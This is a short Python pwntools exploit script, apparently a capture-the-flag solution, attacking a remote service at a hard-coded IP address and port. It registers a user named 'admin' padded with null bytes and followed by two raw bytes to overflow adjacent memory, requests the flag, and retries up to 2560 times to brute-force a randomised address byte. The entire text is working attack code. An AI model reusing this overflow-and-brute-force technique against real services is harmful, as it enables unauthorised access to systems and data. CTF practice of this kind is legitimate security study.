from pwn import *
#context.log_level = 'debug'

def res(name,pwd):
	p.sendlineafter(">\n",str(2))
	p.sendlineafter(":",pwd)
	p.sendlineafter(":",name)

#p = process("./main")

def exp():
	res("admin".ljust(0x10,'\x00')+'\x90\x74',"b")
	p.sendlineafter(">\n",str(1))
	p.sendlineafter(":","flag")

	#gdb.attach(p,"b *$rebase(0xF5C)")
	#raw_input()
	print p.recvuntil('}',timeout=1)

	p.interactive()

i=0
while i<2560:
	try:
		#p = process("./main")
		p = remote("113.201.14.253",38002)
		exp()
		break
	except:
		p.close()
		i+=1





